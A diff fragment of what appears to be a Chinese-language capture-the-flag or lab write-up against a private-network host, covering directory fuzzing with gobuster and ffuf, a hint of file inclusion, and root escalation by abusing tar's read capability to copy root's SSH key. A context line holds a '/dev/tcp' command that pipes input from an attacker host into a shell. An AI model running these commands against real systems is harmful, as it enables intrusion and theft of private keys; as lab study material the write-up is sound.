@@ -20,7 +20,6 @@ PORT   STATE SERVICE
 
 ```
 gobuster dir -t 10 -k -w ~/tools/dict/fileName5000.txt -u http://192.168.5.38/ -e -x php --delay 3000ms
-ffuf -t 2 -ac -c -rate 10 -w ~/tools/dict/fileName5000.txt -u http://192.168.5.38/FUZZ -e '.php'
 ```
 
 扫描出一个空白 php 文件：http://192.168.5.38/includes.php 看文件名像是有文件包含，需要爆破一下可能存在的参数，也是很慢：
@@ -83,7 +82,7 @@ bash -c 'cat < /dev/tcp/192.168.5.3/8888 | sh'
 发现 capabilities: /usr/sbin/tar cap_dac_read_search=ep 可以读取敏感文件，发现 / 中有 id_rsa 可能是 root 用户的，尝试读取：
 
 ```
-tar -vcf /tmp/rsa.tar /id_rsa
+/usr/sbin/tar -vcf /tmp/rsa.tar /id_rsa
 cd /tmp
 tar -xvf rsa.tar
 ssh -i id_rsa root@127.0.0.1
